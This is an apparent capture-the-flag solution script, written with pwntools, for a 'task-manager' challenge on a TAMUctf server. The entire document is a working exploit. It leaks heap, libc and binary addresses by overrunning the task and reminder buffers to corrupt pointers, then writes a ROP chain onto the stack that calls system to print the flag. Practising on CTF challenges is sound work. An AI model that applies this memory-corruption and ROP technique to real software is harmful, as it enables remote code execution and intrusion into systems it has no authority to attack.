from pwn import *

context.binary = elf = ELF("./task-manager", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

MP=b"Enter your input: "
TP=b"Enter task (max. 80 characters): "
RP=b"Enter reminder (max. 72 characters): "
SRIP=0x2724A
MAIN=elf.sym.main
SIZE=0x4050

io = remote("streams.tamuctf.com", 443, ssl=True, sni="task-manager")
rop = ROP(libc)
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
ret = rop.find_gadget(["ret"]).address

def menu(x): io.sendline(str(x).encode()); return io.recvuntil(MP)
def add(x): io.sendline(b"1"); io.recvuntil(TP); io.send(x); return io.recvuntil(MP)
def rem(x): io.sendline(b"4"); io.recvuntil(RP); io.send(x); return io.recvuntil(MP)
def show(): io.sendline(b"2"); return io.recvuntil(MP)
def dele(): io.sendline(b"3"); return io.recvuntil(MP)
def rline(x):
    for l in x.split(b"\n"):
        if l.startswith(b"Reminder: "): return l[10:]

io.recvuntil(b"Enter your name (max. 40 characters): ")
io.sendline(b"X")
io.recvuntil(MP)

x = add(b"A"*80)
sent = u64(x.split(b"\n")[0][len(b"Task you entered: ")+80:].rstrip(b"\n").ljust(8,b"\0"))
task = sent - 0xC0
dummy2 = sent + 0x60

add(b"B"*80 + p64(sent))
add(b"C"*80 + p64(task))
rem(b"R"*64 + p64(task))

x = add(b"D"*8)
dummy4 = u64(rline(x)[64:].ljust(8,b"\0"))
rem(b"R"*64 + p64(task+8))
x = show()
tasks = u64(x.split(b"Task #4: ",1)[1].split(b"\n",1)[0].ljust(8,b"\0"))
saved_rip = tasks + 0xB0

rem(b"R"*64 + p64(dummy4))
dele()
rem(b"R"*64 + p64(task))

x = add(b"E"*8)
dummy5 = u64(rline(x)[64:].ljust(8,b"\0"))
rem(b"R"*64 + p64(saved_rip))
x = show()
libc.address = u64(x.split(b"Task #4: ",1)[1].split(b"\n",1)[0].ljust(8,b"\0")) - SRIP

rem(b"R"*64 + p64(dummy5))
dele()
rem(b"R"*64 + p64(task))

x = add(b"F"*8)
dummy6 = u64(rline(x)[64:].ljust(8,b"\0"))
rem(b"R"*64 + p64(tasks+0xC0))
x = show()
elf.address = u64(x.split(b"Task #4: ",1)[1].split(b"\n",1)[0].ljust(8,b"\0")) - MAIN

rem(b"R"*64 + p64(dummy6))
dele()
rem(b"R"*64 + p64(task))
rem(b"R"*64 + p64(dummy2))
add(b"Z"*80 + p64(0))
dele()
rem(b"R"*64 + p64(task))

cmd = b"cat flag*; exit\x00"
cmd_addr = saved_rip + 0x40
chain = flat(
    libc.address + ret,
    libc.address + pop_rdi, cmd_addr,
    libc.sym.system,
    libc.address + pop_rdi, 0,
    libc.sym.exit
)
payload = chain.ljust(0x40, b"A") + cmd
payload = payload.ljust(88, b"B")

rem(b"R"*64 + p64(saved_rip))
add(payload)
rem(b"R"*64 + p64(dummy2))
dele()
rem(b"R"*64 + p64(elf.address + SIZE))
add(p64(0xffffffffffffffff))
io.sendline(b"5")
print(io.recvall(timeout=3).decode("latin-1", errors="ignore"), end="")